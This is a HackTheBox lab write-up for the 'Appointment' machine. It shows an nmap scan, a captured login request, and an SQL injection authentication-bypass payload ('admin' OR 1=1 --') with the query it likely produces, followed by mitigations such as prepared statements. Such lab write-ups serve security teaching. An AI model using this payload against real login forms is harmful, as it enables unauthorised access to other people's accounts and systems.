# Appointment - HackTheBox Writeup

| Field | Details |
|-------|---------|
| Name | Appointment |
| OS | Linux |
| Difficulty | Very Easy |
| Category | Machine |
| Points | N/A |
| Status | Pwned |
| Date | 2026-03-21 |

---

## Table of Contents

1. [Summary](#summary)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Post-Exploitation / Privilege Escalation](#post-exploitation--privilege-escalation)
6. [Flags](#flags)
7. [Key Takeaways](#key-takeaways)
8. [References](#references)

---

## Summary

Appointment is a web-focused machine that demonstrates SQL injection in an authentication flow. After identifying a login form on port 80, an authentication bypass payload was submitted to manipulate the backend query logic. Successful bypass granted access to the protected page and the flag.

---

## Reconnaissance

### Port Scan

```bash
nmap -sC -sV 10.129.9.249
```

**Open Ports:**

| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | Apache httpd 2.4.38 (Debian) |

Only the web service was exposed, so testing focused on the login application.

---

## Enumeration

The application exposed a login form at:

```text
http://10.129.9.249
```

A request captured during testing:

```http
POST /login.php HTTP/1.1
Host: 10.129.9.249

username=test&password=test
```

This suggested that user input might be unsafely embedded in SQL queries.

---

## Exploitation

### Vulnerability

**OWASP Category:** Injection (SQL Injection)

**Description:**
The login form was vulnerable to SQL injection, allowing authentication bypass.

### Proof of Concept

Payload used:

```text
admin' OR 1=1 --
```

Injected parameters:

```text
username=admin' OR 1=1 --
password=test
```

Likely query behavior:

```sql
SELECT * FROM users
WHERE username='admin' OR 1=1 --'
AND password='test';
```

Because `OR 1=1` evaluates to true and `--` comments out the remainder, authentication was bypassed.

---

## Post-Exploitation / Privilege Escalation

No privilege escalation stage was required for this lab objective.

---

## Flags

| Flag | Hash |
|------|------|
| User flag | Retrieved after login bypass |
| Root flag | N/A |

---

## Key Takeaways

- What I learned: Login forms are high-risk points for SQL injection when queries are not parameterized.
- Techniques used: Request interception and SQLi authentication bypass.
- Tools used: Nmap, browser, Burp Suite.
- Mitigations: Use prepared statements, strict input validation, and avoid dynamic SQL concatenation.

---

## References

- https://app.hackthebox.com
- https://owasp.org/www-project-top-ten/
